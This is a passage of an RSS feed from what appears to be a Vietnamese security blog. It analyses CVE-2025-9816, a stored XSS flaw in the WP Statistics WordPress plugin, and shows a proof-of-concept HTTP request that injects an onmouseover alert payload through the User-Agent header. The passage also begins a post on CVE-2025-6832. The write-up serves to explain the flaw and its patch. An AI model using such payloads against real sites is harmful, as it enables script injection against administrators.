ClientHints) {&#xA;            $this-&amp;gt;setClientHints($clientHints);&#xA;        }&#xA;&#xA;        $this-&amp;gt;addClientParser(new FeedReader());&#xA;        $this-&amp;gt;addClientParser(new MobileApp());&#xA;        $this-&amp;gt;addClientParser(new MediaPlayer());&#xA;        $this-&amp;gt;addClientParser(new PIM());&#xA;        $this-&amp;gt;addClientParser(new Browser());&#xA;        $this-&amp;gt;addClientParser(new Library());&#xA;&#xA;        $this-&amp;gt;addDeviceParser(new HbbTv());&#xA;        $this-&amp;gt;addDeviceParser(new ShellTv());&#xA;        $this-&amp;gt;addDeviceParser(new Notebook());&#xA;        $this-&amp;gt;addDeviceParser(new Console());&#xA;        $this-&amp;gt;addDeviceParser(new CarBrowser());&#xA;        $this-&amp;gt;addDeviceParser(new Camera());&#xA;        $this-&amp;gt;addDeviceParser(new PortableMediaPlayer());&#xA;        $this-&amp;gt;addDeviceParser(new Mobile());&#xA;&#xA;        $this-&amp;gt;addBotParser(new Bot());&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;DeviceDetector&lt;/code&gt; set user-agent v√† th√™m &lt;strong&gt;parser&lt;/strong&gt; cho t·ª´ng lo·∫°i &lt;strong&gt;device/app&lt;/strong&gt;, c√°c parser n√†y c√≥ th·ªÉ li√™n quan ƒë·∫øn &lt;code&gt;$this-&amp;gt;deviceDetector-&amp;gt;parse();&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ·ªü tr√™n.&lt;/p&gt;&#xA;&lt;p&gt;Ta t√¨m hi·ªÉu th·ª≠ ƒë·ªëi s·ªë &lt;code&gt;new Mobile()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Mobile extends AbstractDeviceParser&#xA;{&#xA;    /**&#xA;     * @var string&#xA;     */&#xA;    protected $fixtureFile = &amp;#39;regexes/device/mobiles.yml&amp;#39;;&#xA;&#xA;    /**&#xA;     * @var string&#xA;     */&#xA;    protected $parserName = &amp;#39;mobile&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$fixtureFile&lt;/code&gt; trong &lt;code&gt;Mobile&lt;/code&gt; l√† ƒë∆∞·ªùng d·∫´n ƒë·∫øn file ch·ª©a c√°c regex, ƒë·ªÉ hi·ªÉu r√µ h∆°n, ta nh·∫•n t·ªï h·ª£p ph√≠m &lt;kbd&gt;Ctrl&lt;/kbd&gt; + &lt;kbd&gt;Shift&lt;/kbd&gt; + &lt;kbd&gt;P&lt;/kbd&gt; v√† search v·ªõi &lt;code&gt;regexes/device/mobiles.yml&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/search3.png&#34;&#xA;    alt=&#34;T√¨m ki·∫øm file regexes/device/mobiles.yml&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;T√¨m ki·∫øm file regexes/device/mobiles.yml&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;em&gt;T√¨m ki·∫øm file regexes/device/mobiles.yml&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;N·ªôi dung file &lt;code&gt;mobile.yml&lt;/code&gt;{: .filepath}:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# Gol Mobile (gol-mobile.com)&#xA;Gol Mobile:&#xA;  regex: &amp;#39;(?:F10_PRIME|F3Prime|F9_PLUS|TEAM_7_3G)(?:[);/ ]|$)&amp;#39;&#xA;  device: &amp;#39;smartphone&amp;#39;&#xA;  models:&#xA;    - regex: &amp;#39;F10_PRIME&amp;#39;&#xA;      model: &amp;#39;F10 Prime&amp;#39;&#xA;    - regex: &amp;#39;F3Prime&amp;#39;&#xA;      model: &amp;#39;F3 Prime&amp;#39;&#xA;    - regex: &amp;#39;F9_PLUS&amp;#39;&#xA;      model: &amp;#39;F9 Plus&amp;#39;&#xA;    - regex: &amp;#39;TEAM_7_3G&amp;#39;&#xA;      device: &amp;#39;tablet&amp;#39;&#xA;      model: &amp;#39;Team 7.0 3G&amp;#39;&#xA;&#xA;# Goly: &#xA;Goly:&#xA;  regex: &amp;#39;Goly[ _-]&amp;#39;      # match khi UA c√≥ &amp;#34;Goly-&amp;#34; ho·∫∑c &amp;#34;Goly_&amp;#34; ho·∫∑c &amp;#34;Goly &amp;#34;&#xA;  device: &amp;#39;smartphone&amp;#39;    # lo·∫°i thi·∫øt b·ªã&#xA;  models:&#xA;    - regex: &amp;#39;Goly[ _-]([^;/]&amp;#43;) Build&amp;#39;   # l·∫•y model tr∆∞·ªõc &amp;#34;Build&amp;#34;&#xA;      model: &amp;#39;$1&amp;#39;&#xA;    - regex: &amp;#39;Goly[ _-]([^;/)]&amp;#43;)(?:[;/)]|$)&amp;#39;  # l·∫•y model tr∆∞·ªõc ; / ) ho·∫∑c h·∫øt chu·ªói&#xA;      model: &amp;#39;$1&amp;#39;&#xA;&#xA;# other model&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;mobile.yml&lt;/code&gt;{: .filepath} ch·ª©a c√°c regex ƒë·ªÉ nh·∫≠n di·ªán thi·∫øt b·ªã mobile, l·∫•y model c·ªßa n√≥.&lt;/p&gt;&#xA;&lt;p&gt;Sau khi &lt;code&gt;DeviceDetector&lt;/code&gt; ƒë∆∞·ª£c kh·ªüi t·∫°o trong &lt;code&gt;__construct&lt;/code&gt; c·ªßa class &lt;code&gt;UserAgentService&lt;/code&gt; th√¨ &lt;code&gt;parse()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ ph√¢n t√≠ch c√∫ ph√°p c·ªßa user-agent.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function parse(): void&#xA;{&#xA;    if ($this-&amp;gt;isParsed()) {&#xA;        return;&#xA;    }&#xA;&#xA;    $this-&amp;gt;parsed = true;&#xA;&#xA;    // skip parsing for empty useragents or those not containing any letter (if no client hints were provided)&#xA;    if ((empty($this-&amp;gt;userAgent) || !\preg_match(&amp;#39;/([a-z])/i&amp;#39;, $this-&amp;gt;userAgent))&#xA;        &amp;amp;&amp;amp; empty($this-&amp;gt;clientHints)&#xA;    ) {&#xA;        return;&#xA;    }&#xA;    // other parse&#xA;&#xA;    $this-&amp;gt;parseDevice();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu ch∆∞a ƒë∆∞·ª£c &lt;code&gt;parse (user-agent m·ªõi)&lt;/code&gt; th√¨ th·ª±c hi·ªán parse b·∫±ng h√†m &lt;code&gt;parseDevice()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function parseDevice(): void&#xA;{&#xA;    $parsers = $this-&amp;gt;getDeviceParsers();&#xA;&#xA;    foreach ($parsers as $parser) {&#xA;        $parser-&amp;gt;setYamlParser($this-&amp;gt;getYamlParser());&#xA;        $parser-&amp;gt;setCache($this-&amp;gt;getCache());&#xA;        $parser-&amp;gt;setUserAgent($this-&amp;gt;getUserAgent());&#xA;        $parser-&amp;gt;setClientHints($this-&amp;gt;getClientHints());&#xA;&#xA;        if ($parser-&amp;gt;parse()) {&#xA;            $this-&amp;gt;device = $parser-&amp;gt;getDeviceType();&#xA;            $this-&amp;gt;model  = $parser-&amp;gt;getModel();&#xA;            $this-&amp;gt;brand  = $parser-&amp;gt;getBrand();&#xA;&#xA;            break;&#xA;        }&#xA;    }&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;parseDevice()&lt;/code&gt; l·∫•y c√°c parser ƒë√£ ƒë∆∞·ª£c kh·ªüi t·∫°o trong &lt;code&gt;__construct&lt;/code&gt; v√† g√°n v√†o &lt;code&gt;$parsers&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug3.png&#34;&#xA;    alt=&#34;Debug tab cho bi·∫øn $parsers&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug tab cho bi·∫øn $parsers&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Sau ƒë√≥ duy·ªát qua &lt;code&gt;$parsers&lt;/code&gt;, set c·∫•u h√¨nh bao g·ªìm c√°c regex trong file &lt;code&gt;.yml&lt;/code&gt;, n·∫øu regex kh·ªõp t·ª©c parse th√†nh c√¥ng, g√°n model, device, brand cho &lt;code&gt;DeviceDetector&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug4.png&#34;&#xA;    alt=&#34;Debug tab g√°n gi√° tr·ªã cho c√°c tham s·ªë c·ªßa DeviceDetector&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug tab g√°n gi√° tr·ªã cho c√°c tham s·ªë c·ªßa DeviceDetector&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug5.png&#34;&#xA;    alt=&#34;Debug tab gi√° tr·ªã c·ªßa model&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug tab gi√° tr·ªã c·ªßa model&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Nh∆∞ v·∫≠y ta ƒë√£ bi·∫øt ƒë∆∞·ª£c c√°ch ki·ªÉm so√°t model tr∆∞·ªõc khi g√°n n√≥ v√†o &lt;code&gt;$visitor&lt;/code&gt; v√† th√™m v√†o database.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug6.png&#34;&#xA;    alt=&#34;Debug tab gi√° tr·ªã c·ªßa model trong $visitor&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug tab gi√° tr·ªã c·ªßa model trong $visitor&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ki·ªÉm tra &lt;strong&gt;database&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SELECT ID, last_counter, referred, agent, platform, version, device, model FROM wp_statistics_visitor;&#xA;&amp;#43;----&amp;#43;--------------&amp;#43;----------&amp;#43;---------------&amp;#43;----------&amp;#43;---------&amp;#43;------------&amp;#43;--------------&amp;#43;&#xA;| ID | last_counter | referred | agent         | platform | version | device     | model        |&#xA;&amp;#43;----&amp;#43;--------------&amp;#43;----------&amp;#43;---------------&amp;#43;----------&amp;#43;---------&amp;#43;------------&amp;#43;--------------&amp;#43;&#xA;| 63 | 2025-10-01   |          | Chrome Mobile | Android  | 93      | smartphone | Google Pixel |&#xA;| 64 | 2025-10-01   |          | Chrome Mobile | Android  | 93      | smartphone | Goly payload |&#xA;&amp;#43;----&amp;#43;--------------&amp;#43;----------&amp;#43;---------------&amp;#43;----------&amp;#43;---------&amp;#43;------------&amp;#43;--------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ki·ªÉm tra trong &lt;strong&gt;UI tab models&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/ui1.png&#34;&#xA;    alt=&#34;Model ƒë∆∞·ª£c hi·ªÉn th·ªã trong UI tab models&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Model ƒë∆∞·ª£c hi·ªÉn th·ªã trong UI tab models&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Source:&lt;/strong&gt; &lt;code&gt;User-Agent&lt;/code&gt; header (POST &lt;code&gt;/wp-json/wp-statistics/v2/hit&lt;/code&gt;) ‚Äî DeviceDetector parse ‚Üí &lt;code&gt;getModel()&lt;/code&gt;.&#xA;&lt;strong&gt;Sink:&lt;/strong&gt; &lt;code&gt;includes/admin/templates/pages/devices/models.php&lt;/code&gt; ‚Äî &lt;code&gt;echo $item-&amp;gt;model&lt;/code&gt; (kh√¥ng &lt;code&gt;esc_html()&lt;/code&gt; / &lt;code&gt;esc_attr()&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Attacker g·ª≠i UA ch·ª©a payload XSS trong model&lt;/li&gt;&#xA;&lt;li&gt;Model ch·ª©a payload ƒë∆∞·ª£c l∆∞u trong database&lt;/li&gt;&#xA;&lt;li&gt;Admin m·ªü tab models =&amp;gt; payload ch·∫°y.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;G·ª≠i request ch·ª©a XSS payload:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp-statistics/v2/hit HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Linux; Android 14; Goly &amp;#34;onmouseover=alert()-&amp;#34; Build) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36&#xA;&#xA;wp_statistics_hit=1&amp;amp;source_type=home&amp;amp;source_id=0&amp;amp;search_query=&amp;amp;signature=787b07b8979cb982ec89a4f103a68081&amp;amp;endpoint=hit&amp;amp;referred=&amp;amp;page_uri=Lw%3D%3D&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Admin truy c·∫≠p endpoint v√† hover v√†o model ch·ª©a payload:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=wps_devices_page&amp;amp;tab=models&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/result.png&#34;&#xA;    alt=&#34;Result ‚Äî PoC execution screenshot&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Result ‚Äî PoC execution screenshot&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;D√πng &lt;code&gt;&amp;quot;&lt;/code&gt; ƒë·ªÉ ƒë√≥ng title, t·∫°o alert() th√¥ng qua s·ª± ki·ªán &lt;strong&gt;onmouseover&lt;/strong&gt; v√¨ ƒë√¢y l√† th·∫ª &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt;, &lt;code&gt;-&lt;/code&gt; ƒë√πng ƒë·ªÉ n·ªëi chu·ªói trong JavaScript tr√°nh ƒë∆∞·ª£c l·ªói c√∫ ph√°p&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-9816&lt;/strong&gt; trong plugin &lt;strong&gt;WP Statistics &amp;lt;= 14.15.4&lt;/strong&gt; cho ph√©p &lt;strong&gt;Stored XSS&lt;/strong&gt; th√¥ng qua gi√° tr·ªã &lt;code&gt;model&lt;/code&gt; l·∫•y t·ª´ header &lt;code&gt;User-Agent&lt;/code&gt;. Payload ƒë∆∞·ª£c l∆∞u v√†o DB v√† hi·ªÉn th·ªã trong trang qu·∫£n tr·ªã &lt;strong&gt;Device Models&lt;/strong&gt; m√† kh√¥ng escape ƒë√∫ng c√°ch. B·∫£n v√° &lt;strong&gt;14.15.5&lt;/strong&gt; ƒë√£ th√™m &lt;code&gt;esc_html()&lt;/code&gt;/&lt;code&gt;esc_attr()&lt;/code&gt; khi in ra HTML.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt; nguy hi·ªÉm h∆°n reflected v√¨ t·ªìn t·∫°i l√¢u d√†i trong DB.&lt;/li&gt;&#xA;&lt;li&gt;D·ªØ li·ªáu ƒë·∫øn t·ª´ &lt;strong&gt;HTTP headers&lt;/strong&gt; c≈©ng c·∫ßn ƒë∆∞·ª£c coi nh∆∞ input kh√¥ng tin c·∫≠y.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n &lt;strong&gt;escape khi output&lt;/strong&gt; thay v√¨ ch·ªâ sanitize khi input.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Update plugin&lt;/strong&gt; l√™n b·∫£n m·ªõi nh·∫•t ƒë·ªÉ ngƒÉn ch·∫∑n khai th√°c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-statistics/vulnerability/wordpress-wp-statistics-plugin-14-5-4-unauthenticated-stored-cross-site-scripting-via-user-agent-header-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Statistics &amp;lt;= 14.15.4 - CVE-2025-9816&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6832 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-07-cve-2025-6832/</link>
      <pubDate>Tue, 07 Oct 2025 17:38:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-07-cve-2025-6832/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;&lt;strong&gt;L·ªó h·ªïng Reflected Cross-Site Scripting (XSS)&lt;/strong&gt; trong plugin &lt;strong&gt;All in One Time Clock Lite&lt;/strong&gt; cho WordPress.&#xA;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ tham s·ªë &lt;strong&gt;nonce&lt;/strong&gt; ·ªü c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;2.0&lt;/strong&gt;, do &lt;strong&gt;x·ª≠ l√Ω ƒë·∫ßu v√†o kh√¥ng ƒë·∫ßy ƒë·ªß&lt;/strong&gt; v√† &lt;strong&gt;kh√¥ng escape ƒë·∫ßu ra&lt;/strong&gt;.&#xA;K·∫ª t·∫•n c√¥ng (k·ªÉ c·∫£ kh√¥ng x√°c th·ª±c) c√≥ th·ªÉ ch√®n c√°c ƒëo·∫°n script t√πy √Ω v√†o trang; nh·ªØng script n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi n·∫°n nh√¢n th·ª±c hi·ªán h√†nh ƒë·ªông b·ªã thao t√∫ng (v√≠ d·ª•: b·∫•m v√†o m·ªôt li√™n k·∫øt).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6832&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6832&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/aio-time-clock-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress All in One Time Clock Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 